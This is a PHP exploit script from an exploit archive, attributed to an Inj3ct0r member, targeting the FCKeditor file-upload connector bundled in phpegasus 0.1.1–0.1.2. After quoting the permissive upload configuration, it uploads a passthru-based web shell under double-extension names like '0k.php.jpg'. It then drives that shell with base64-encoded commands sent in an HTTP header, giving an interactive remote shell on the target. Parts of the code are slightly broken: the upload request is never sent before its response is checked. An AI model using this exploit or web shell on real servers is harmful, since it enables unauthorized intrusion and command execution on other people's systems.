phpegasus (fckeditor) Remote Arbitrary File Upload Exploit
==========================================================

<?php
/*

 1-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=0
 0     _                   __           __       __                     1
 1   /&#039; \            __  /&#039;__`\        /\ \__  /&#039;__`\                   0
 0  /\_, \    ___   /\_\/\_\ \ \    ___\ \ ,_\/\ \/\ \  _ ___           1
 1  \/_/\ \ /&#039; _ `\ \/\ \/_/_\_<_  /&#039;___\ \ \/\ \ \ \ \/\`&#039;__\          0
 0     \ \ \/\ \/\ \ \ \ \/\ \ \ \/\ \__/\ \ \_\ \ \_\ \ \ \/           1
 1      \ \_\ \_\ \_\_\ \ \ \____/\ \____\\ \__\\ \____/\ \_\           0
 0       \/_/\/_/\/_/\ \_\ \/___/  \/____/ \/__/ \/___/  \/_/           1
 1                  \ \____/ >> Exploit database separated by exploit   0
 0                   \/___/          type (local, remote, DoS, etc.)    1
 1                                                                      1
 0  [+] Site            : Inj3ct0r.com                                  0
 1  [+] Support e-mail  : submit[at]inj3ct0r.com                        1
 0                                                                      0
 1                    ########################################          1
 0                    I&#039;m eidelweiss member from Inj3ct0r Team          1
 1                    ########################################          0
 0-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-==-=-=-1

 Vendor: www.phpegasus.com
 Download : http://www.phpegasus.com/versions/phpegasus0-1-2b.zip
 exploited by ..: eidelweiss
 Affected: phpegasus0_1_1 , phpegasus0_1_2
 details..: works with an Apache server with the mod_mime module installed (if specific)
  
 [-] vulnerable code in path/core/editor/editor/filemanager/connectors/php/config.php
     
    [*] // SECURITY: You must explicitly enable this "connector". (Set it to "true").
    [*] 
    [*]	$Config[&#039;Enabled&#039;] = true ;
    [*]
    [*] // Path to user files relative to the document root.
    [*] $Config[&#039;UserFilesPath&#039;] = &#039;/userfiles/&#039; ;
    [*]
    [*] // user files directory. Usefull if you are using a virtual directory, symbolic
    [*] // link or alias. Examples: &#039;C:\\MySite\\UserFiles\\&#039; or &#039;/root/mysite/UserFiles/&#039;.
    [*] // Attention: The above &#039;UserFilesPath&#039; must point to the same directory.
    [*] 
    [*]
    [*] $Config[&#039;AllowedExtensions&#039;][&#039;File&#039;]	= array(&#039;7z&#039;, &#039;aiff&#039;, &#039;asf&#039;, &#039;avi&#039;, &#039;bmp&#039;, &#039;csv&#039;, &#039;doc&#039;, &#039;fla&#039;, &#039;flv&#039;, &#039;gif&#039;, &#039;gz&#039;, [....]
    [*] $Config[&#039;DeniedExtensions&#039;][&#039;File&#039;]     = array() ;
    [*]
    [*] $Config[&#039;AllowedExtensions&#039;][&#039;Image&#039;]   = array(&#039;bmp&#039;,&#039;gif&#039;,&#039;jpeg&#039;,&#039;jpg&#039;,&#039;png&#039;) ;
    [*] $Config[&#039;DeniedExtensions&#039;][&#039;Image&#039;]    = array() ;
    [*]
    [*] $Config[&#039;AllowedExtensions&#039;][&#039;Flash&#039;]   = array(&#039;swf&#039;,&#039;flv&#039;) ;
    [*] $Config[&#039;DeniedExtensions&#039;][&#039;Flash&#039;]    = array() ;
    [*]
    [*] $Config[&#039;AllowedExtensions&#039;][&#039;Media&#039;]   = array(&#039;aiff&#039;, &#039;asf&#039;, &#039;avi&#039;, &#039;bmp&#039;, &#039;fla&#039;, &#039;flv&#039;, &#039;gif&#039;, &#039;jpeg&#039;, &#039;jpg&#039;, &#039;mid&#039;, &#039;mov&#039;, &#039;mp3&#039;, &#039;mp4&#039;, &#039;mpc&#039;, &#039;mpeg&#039;, &#039;mpg&#039;, &#039;png&#039;, &#039;qt&#039;, &#039;ram&#039;, &#039;rm&#039;, &#039;rmi&#039;, &#039;rmvb&#039;, &#039;swf&#039;, &#039;tif&#039;, &#039;tiff&#039;, &#039;wav&#039;, &#039;wma&#039;, &#039;wmv&#039;) ;
    [*] $Config[&#039;DeniedExtensions&#039;][&#039;Media&#039;]    = array() ;
     
    with a default configuration of this script, an attacker might be able to upload arbitrary
    files containing malicious PHP code due to multiple file extensions isn&#039;t properly checked
*/
 
*/
error_reporting(0);
set_time_limit(0);
ini_set("default_socket_timeout", 5);
function http_send($host, $packet)
{
 $sock = fsockopen($host, 80);
 while (!$sock)
 {
  print "\n[-] No response from {$host}:80 Trying again...";
  $sock = fsockopen($host, 80);
 }
 fputs($sock, $packet);
 while (!feof($sock)) $resp .= fread($sock, 1024);
 fclose($sock);
 return $resp;
}
function upload()
{
 global $host, $path;
  
 $connector = "/core/editor/editor/filemanager/connectors/php/config.php";
 $file_ext  = array("zip", "jpg", "fla", "doc", "xls", "rtf", "csv");
  
 foreach ($file_ext as $ext)
 {
  print "\n[-] Trying to upload with .{$ext} extension...";
   
  $data  = "--abcdef\r\n";
  $data .= "Content-Disposition: form-data; name=\"NewFile\"; filename=\"0k.php.{$ext}\"\r\n";
  $data .= "Content-Type: application/octet-stream\r\n\r\n";
  $data .= "<?php \${print(_code_)}.\${passthru(base64_decode(\$_SERVER[HTTP_CMD]))}.\${print(_code_)} ?>\r\n";
  $data .= "--abcdef--\r\n";
   
  $packet  = "POST {$path}{$connector}?Command=FileUpload&CurrentFolder={$path} HTTP/1.0\r\n";
  $packet .= "Host: {$host}\r\n";
  $packet .= "Content-Length: ".strlen($data)."\r\n";
  $packet .= "Content-Type: multipart/form-data; boundary=abcdef\r\n";
  $packet .= "Connection: close\r\n\r\n";
  $packet .= $data;
   
   
  if (!in_array(intval($html[1]), array(0, 201))) die("\n[-] Upload failed! (Error {$html[1]}: {$html[2]})\n");
   
  $packet  = "GET {$path}0k.php.{$ext} HTTP/1.0\r\n";
  $packet .= "Host: {$host}\r\n";
  $packet .= "Connection: close\r\n\r\n";
  $html    = http_send($host, $packet);
   
  if (!eregi("print", $html) and eregi("_code_", $html)) return $ext;
   
  sleep(1);
 }
  
 return false;
}
print "\n+--------------------------------------------------------------------------+";
print "\n| phpegasus (fckeditor) Remote Arbitrary File Upload Exploit by eidelweiss |";
print "\n+--------------------------------------------------------------------------+\n";
if ($argc < 3)
{
 print "\nUsage......: php $argv[0] host path\n";
 print "\nExample....: php $argv[0] localhost /";
 print "\nExample....: php $argv[0] localhost /phpegasus/\n";
 die();
}
$host = $argv[1];
$path = $argv[2];
if (!($ext = upload())) die("\n\n[-] Exploit failed...\n");
else print "\n[-] Shell uploaded...starting it!\n";
define(STDIN, fopen("php://stdin", "r"));
while(1)
{
 print "\phpegasus-shell# ";
 $cmd = trim(fgets(STDIN));
 if ($cmd != "exit")
 {
  $packet = "GET {$path}0k.php.{$ext} HTTP/1.0\r\n";
  $packet.= "Host: {$host}\r\n";
  $packet.= "Cmd: ".base64_encode($cmd)."\r\n";
  $packet.= "Connection: close\r\n\r\n";
  $html   = http_send($host, $packet);
  if (!eregi("_code_", $html)) die("\n[-] Exploit failed...\n");
  $shell = explode("_code_", $html);
  print "\n{$shell[1]}";
 }
 else break;
}
?>




